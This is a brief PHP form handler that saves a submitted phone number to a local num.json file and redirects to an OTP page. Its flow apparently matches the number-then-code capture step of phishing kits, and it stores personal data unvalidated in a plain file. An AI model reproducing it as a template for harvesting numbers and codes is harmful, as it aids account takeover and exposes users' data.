<?php
$num = $_POST['phone_number'];
$data['dev'][] = array('number'=>$num);
$json = json_encode($data);
$file = fopen("num.json","w");
fwrite($file,$json);
fclose($file);
header('Location: otp.php');
exit();